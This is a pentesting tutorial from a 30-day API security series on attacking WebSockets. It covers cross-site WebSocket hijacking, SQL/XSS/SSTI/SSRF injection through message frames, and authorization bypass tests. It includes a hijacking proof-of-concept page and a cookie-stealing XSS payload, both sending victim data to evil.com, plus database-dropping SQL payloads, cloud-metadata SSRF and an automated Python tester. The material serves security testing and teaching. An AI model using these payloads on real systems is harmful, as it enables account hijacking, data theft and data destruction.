# WebSocket Pentesting: CSWSH, Injection & WAF Bypass

> **Series:** 30-Day API Pentesting | **Day 21** | Week 3: Tools & Techniques  
> **Difficulty:** Beginner → Intermediate  
> **Topic:** WebSocket Security Testing Cheatsheet

---

## What Makes WebSockets Different from HTTP?

To understand why WebSocket security is its own discipline, you first need to understand what makes it fundamentally different from HTTP.

### HTTP — The Request/Response Model

Every HTTP interaction follows the same pattern: client sends a request, server sends a response, connection closes. The server can never "push" data to you unless you ask first.

```
You (browser)          Server
     |                   |
     |--- GET /messages ->|
     |<-- 200 + data -----|
     |   (connection      |
     |    closed)         |
     |--- GET /messages ->|   ← you have to ask again
     |<-- 200 + data -----|
```

### WebSocket — The Persistent Tunnel

WebSocket starts as HTTP (the "handshake"), but then upgrades into a persistent bidirectional connection. Both sides can send data anytime without waiting for a request.

```
You (browser)              Server
     |                        |
     |--- HTTP GET /ws ------->|  ← handshake (HTTP)
     |    Upgrade: websocket   |
     |<-- 101 Switching -------|  ← connection upgraded
     |                        |
     |<=== persistent pipe ===>|  ← now it's WebSocket
     |                        |
     |<-- {"event":"message"} -|  ← server pushes anytime
     |--- {"action":"reply"} ->|  ← you can send anytime
     |<-- {"event":"update"} --|  ← server pushes again
```

### Why This Matters for Security

```
What WAFs inspect:       HTTP headers, query params, POST body, URL
What WAFs miss:          WebSocket frames sent AFTER the upgrade handshake

The handshake = HTTP → WAF can inspect it
The messages   = WebSocket frames → WAF is completely blind

This means:
✗ WAF SQLi rules don't apply to WS messages
✗ WAF XSS filters don't apply to WS messages  
✗ WAF rate limiting often doesn't count WS messages
✓ Everything flows through the WebSocket tunnel unchecked
```

---

## Part 1: Finding WebSocket Endpoints

### In Burp Suite

Burp Suite has a dedicated WebSocket History tab, separate from the normal HTTP History.

```
Proxy → WebSocket History tab
       (not the HTTP History tab — a different tab!)

You'll see:
#  | Direction | URL                          | Message
1  | Outgoing  | wss://target.com/ws/chat     | {"action":"connect"}
2  | Incoming  | wss://target.com/ws/chat     | {"event":"connected","userId":42}
3  | Outgoing  | wss://target.com/ws/chat     | {"action":"getMessages"}
4  | Incoming  | wss://target.com/ws/chat     | {"messages":[...]}
```

### In JavaScript Source Files

```bash
# WebSocket URLs are often hardcoded in frontend JS
curl -s https://target.com/app.js | grep -oE 'wss?://[^"'"'"']+' | sort -u

# Also look for WebSocket constructor calls
curl -s https://target.com/app.js | grep -oE 'new WebSocket\([^)]+\)' | head -20

# Common WebSocket endpoint paths:
/ws
/websocket
/socket
/realtime
/live
/stream
/chat
/notifications
/events
/api/ws
/sockjs/...     ← SockJS fallback
/socket.io/...  ← Socket.IO
```

### Confirming a WebSocket Endpoint

```bash
# Install wscat (Node.js WebSocket client)
npm install -g wscat

# Connect and see what happens
wscat -c wss://target.com/ws
# Connected → you'll see what messages the server sends on connect

# With authentication header
wscat -c wss://target.com/ws \
    --header "Authorization: Bearer YOUR_JWT_TOKEN"

# With cookies
wscat -c wss://target.com/ws \
    --header "Cookie: session=YOUR_SESSION_COOKIE"
```

---

## Part 2: Understanding the WebSocket Handshake

Before attacking, understand what happens during the handshake. This is the HTTP phase — the only part WAFs can inspect.

```http
GET /ws/chat HTTP/1.1
Host: target.com
Upgrade: websocket                        ← key header triggering upgrade
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com                ← where the connection comes from
Cookie: session=abc123def456              ← authentication via cookies
Authorization: Bearer eyJhbGci...         ← OR via auth header
```

Server responds:
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Critical security note:** The `Origin` header in the handshake tells the server which website is making the connection. If the server doesn't validate this — **Cross-Site WebSocket Hijacking (CSWSH)** is possible.

---

## Attack 1: Cross-Site WebSocket Hijacking (CSWSH)

### Why This Works

WebSocket connections triggered from a browser automatically include the user's cookies (just like regular HTTP requests). If the server doesn't validate the `Origin` header, any website can initiate a WebSocket connection to the target using the victim's cookies.

This is essentially CSRF but for WebSocket connections — and since WebSockets don't use CSRF tokens, it's often unprotected.

### Testing for CSWSH

```bash
# Step 1: Check the WS handshake Origin in Burp
# Look at the handshake request → note what Origin header the server accepts

# Step 2: Test with a different Origin
# Intercept the WS handshake in Burp → change Origin → forward
# If server responds with 101 → Origin not validated → CSWSH possible!

# Step 3: Check if connection uses only cookies (no token in URL/header)
# If auth = cookies only → CSWSH is exploitable
# If auth = token in URL ws://target.com/ws?token=XXX → check if token is predictable
```

### CSWSH Proof of Concept

```html
<!-- Host this at evil.com/cswsh.html -->
<!-- Victim visits while logged into target.com -->
<!DOCTYPE html>
<html>
<head><title>Innocent Page</title></head>
<body>
<script>
// Open WebSocket to target.com using victim's session cookies
// Browser automatically sends target.com cookies with the connection
var ws = new WebSocket('wss://target.com/ws/chat');

ws.onopen = function() {
    console.log('Connected using victim cookies!');
    
    // Request sensitive data
    ws.send(JSON.stringify({
        "action": "getProfile"
    }));
    
    ws.send(JSON.stringify({
        "action": "getMessages",
        "limit": 100
    }));
};

ws.onmessage = function(event) {
    // Receive and exfiltrate victim's data
    var data = event.data;
    console.log('Received:', data);
    
    // Send stolen data to attacker server
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: data,
        headers: {'Content-Type': 'application/json'}
    });
};

ws.onerror = function(error) {
    console.log('Error:', error);
    fetch('https://evil.com/collect?error=true');
};
</script>
</body>
</html>
```

### Bypassing Origin Checks

```bash
# If server validates Origin but does it weakly:

# 1. Regex bypass — if server checks /target.com$/
Origin: https://evil.target.com          # subdomain
Origin: https://target.com.evil.com      # matches regex but wrong domain

# 2. Case variation
Origin: https://TARGET.COM               # case insensitive match

# 3. Null origin (sandboxed iframe trick)
Origin: null
```

---

## Attack 2: Injection via WebSocket Messages

WebSocket messages flow directly into backend logic — database queries, template engines, command executors. Since WAFs don't inspect these messages, injections that would normally be caught fly through.

### Capturing Messages in Burp

```
1. Burp → Proxy → WebSocket History tab
2. Find an outgoing message
3. Right-click → Send to Repeater
4. Burp WebSocket Repeater opens:
   - Left panel: the message you want to modify
   - Right panel: server's response
5. Modify message → Click Send → see response
6. Repeat with injection payloads
```

### SQL Injection via WebSocket

```javascript
// Normal message:
{"action": "search", "query": "laptop"}

// SQL injection payloads to try in the "query" field:
{"action": "search", "query": "x' OR 1=1--"}
{"action": "search", "query": "x' UNION SELECT username,password FROM users--"}
{"action": "search", "query": "x'; WAITFOR DELAY '0:0:5'--"}  // time-based blind

// Also try in other fields:
{"action": "getUser", "userId": "1 OR 1=1"}
{"action": "getOrder", "orderId": "1; DROP TABLE orders;--"}
```

### Stored XSS via WebSocket

```javascript
// Normal chat message:
{"action": "sendMessage", "content": "Hello!", "room": "general"}

// XSS payloads:
{"action": "sendMessage", "content": "<script>fetch('https://evil.com?c='+document.cookie)</script>"}
{"action": "sendMessage", "content": "<img src=x onerror=alert(document.domain)>"}
{"action": "updateProfile", "name": "<script>evil()</script>"}
// If stored in DB and rendered for all users → Stored XSS!
```

### SSTI via WebSocket

```javascript
// Test for Server-Side Template Injection:
{"action": "render", "template": "{{7*7}}"}      // Jinja2 → should return 49
{"action": "sendEmail", "subject": "${7*7}"}      // FreeMarker/Spring
{"action": "generateReport", "title": "#{7*7}"}  // Ruby/Thymeleaf

// If response contains "49" → SSTI confirmed → potential RCE!
```

### SSRF via WebSocket

```javascript
// If WS endpoint fetches URLs:
{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
{"action": "importData", "source": "http://internal-service:6379"}
{"action": "webhook", "callback": "http://burpcollaborator.net/ws-ssrf"}
```

---

## Attack 3: Authentication and Authorization Testing

### Test 1: Unauthenticated WebSocket Connection

```bash
# Connect WITHOUT any auth credentials
wscat -c wss://target.com/ws
# → If connected and server sends data → no auth required!

# Also try with invalid token
wscat -c wss://target.com/ws \
    --header "Authorization: Bearer INVALID_TOKEN"
# → If 101 Switching Protocols → token not validated at handshake!
```

### Test 2: Auth Checked Only at Handshake

```bash
# Some servers check auth once (at handshake) then trust all messages

# Step 1: Connect as regular user (valid token)
# Step 2: After connection established, send admin-only message types

# Try these in Burp WS Repeater after connecting as regular user:
{"action": "getAdminUsers"}
{"action": "deleteUser", "userId": 1}
{"action": "updateUserRole", "userId": 1, "role": "admin"}
{"action": "exportDatabase"}
{"action": "getSystemConfig"}
{"action": "viewAllOrders"}

# If any returns data instead of "unauthorized" → BFLA in WebSocket!
```

### Test 3: Message-Level Privilege Escalation

```bash
# Manipulate fields that control identity/permissions inside messages
{"userId": 1, "action": "getProfile"}   # change userId to admin's ID → BOLA
{"role": "admin", "action": "login"}    # inject role in auth message
{"isAdmin": true, "action": "connect"}  # try to elevate at connection time
```

### Test 4: Token Reuse After Logout

```bash
# Step 1: Connect WebSocket, note the session token
wscat -c wss://target.com/ws \
    --header "Cookie: session=SESSION_TOKEN"

# Step 2: In another window, log out via HTTP
curl -X POST https://target.com/api/logout \
    -H "Cookie: session=SESSION_TOKEN"

# Step 3: Keep sending WS messages with original connection
# If server still responds after logout → session not invalidated properly!
```

---

## Part 4: Tools and Workflow

### wscat — Interactive WebSocket Shell

```bash
# Install
npm install -g wscat

# Basic connection
wscat -c wss://target.com/ws

# With JWT token
wscat -c wss://target.com/ws \
    --header "Authorization: Bearer TOKEN"

# With custom headers
wscat -c wss://target.com/ws \
    --header "Cookie: session=abc123" \
    --header "Origin: https://target.com"

# Once connected, type messages interactively:
# > {"action":"getMessages","limit":100}
# < {"messages":[{"id":1,"content":"hello","userId":42},...]}
```

### websocat — Scriptable WebSocket Tool

```bash
# Install (Rust binary)
cargo install websocat
# Or download from: https://github.com/vi/websocat/releases

# Basic usage
echo '{"action":"getProfile"}' | websocat wss://target.com/ws

# With headers
websocat wss://target.com/ws \
    -H "Authorization: Bearer TOKEN" \
    -H "Origin: https://target.com"

# Pipe payloads from file
cat payloads.txt | websocat wss://target.com/ws

# Listen for all incoming messages
websocat wss://target.com/ws --no-close -
```

### Burp Suite — The Best Tool for WS Pentesting

```
Key Burp features for WebSocket testing:

1. WebSocket History tab
   → Separate from HTTP History
   → Shows all WS messages with direction (↑ outgoing / ↓ incoming)
   → Can modify and resend from here

2. WS Repeater (right-click any WS message → Send to Repeater)
   → Stays connected while you modify and resend
   → Shows server response immediately
   → Best for manual injection testing

3. Match and Replace (Proxy → Options → Match and Replace)
   → Automatically modify WS messages on the fly
   → Great for replacing userId across all messages

4. Extension: "WebSocket Fuzzer"
   → Automated fuzzing of WebSocket message fields
```

### Python Automation Script

```python
#!/usr/bin/env python3
"""WebSocket Security Tester"""
import asyncio
import websockets
import json

TARGET = "wss://target.com/ws"
TOKEN  = "Bearer YOUR_TOKEN"

INJECTION_PAYLOADS = [
    "x' OR 1=1--",
    "x' UNION SELECT username,password FROM users--",
    "<script>alert(document.domain)</script>",
    "{{7*7}}",
    "${7*7}",
    "http://169.254.169.254/latest/meta-data/",
]

async def test_injection():
    headers = {
        "Authorization": TOKEN,
        "Origin": "https://target.com"
    }
    
    async with websockets.connect(TARGET, extra_headers=headers) as ws:
        print(f"Connected to {TARGET}")
        
        # Receive initial messages
        try:
            init_msg = await asyncio.wait_for(ws.recv(), timeout=3)
            print(f"Server init: {init_msg[:100]}")
        except asyncio.TimeoutError:
            pass
        
        # Test injection in every message field
        for payload in INJECTION_PAYLOADS:
            test_msg = json.dumps({
                "action": "search",
                "query": payload
            })
            await ws.send(test_msg)
            print(f"Sent: {test_msg[:60]}")
            
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=3)
                print(f"Response: {response[:100]}")
                
                # Flag interesting responses
                if any(kw in response.lower() for kw in 
                       ["error", "sql", "exception", "syntax", "49", "alert"]):
                    print(f"!!! INTERESTING RESPONSE !!!")
            except asyncio.TimeoutError:
                print("Timeout (no response)")

async def test_cswsh():
    # Test with evil origin
    evil_headers = {
        "Cookie": "session=VICTIM_COOKIE",
        "Origin": "https://evil.com"  # different origin!
    }
    
    try:
        async with websockets.connect(TARGET, extra_headers=evil_headers) as ws:
            print("CSWSH: Connected with evil origin! Server doesn't validate Origin!")
            msg = await asyncio.wait_for(ws.recv(), timeout=3)
            print(f"Received data: {msg[:100]}")
    except Exception as e:
        print(f"CSWSH blocked: {e}")

async def test_unauth():
    # Test without any auth
    try:
        async with websockets.connect(TARGET) as ws:
            print("Unauthenticated WS connection accepted!")
            msg = await asyncio.wait_for(ws.recv(), timeout=3)
            print(f"Data received without auth: {msg[:100]}")
    except Exception as e:
        print(f"Auth required: {e}")

async def main():
    print("=== WebSocket Security Testing ===")
    print("\n[1] Testing unauthenticated access...")
    await test_unauth()
    print("\n[2] Testing CSWSH (origin validation)...")
    await test_cswsh()
    print("\n[3] Testing message injection...")
    await test_injection()

asyncio.run(main())
```

---

## Checklist

```
☐  Find WS endpoints — Burp WS History tab + grep wss:// in JS files
☐  Read handshake — check Origin header, auth mechanism, Sec-WebSocket-* headers
☐  Test CSWSH — evil.com JS connects to target WS → cookies sent? Data returned?
☐  Check Origin validation — change Origin header → server accepts? → CSWSH possible
☐  Connect unauthenticated — wscat without token → server allows? → auth bypass
☐  Inject every message field — SQLi/XSS/SSTI/SSRF in all WS message parameters
☐  Try admin message types — {action:'getAdmin'} as regular user → BFLA?
☐  Manipulate userId/role in messages — {userId:1} → BOLA?
☐  Replay after logout — old WS session still works? → no invalidation = bug
☐  Send to Burp Repeater — modify and resend messages efficiently
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 21 of 30*
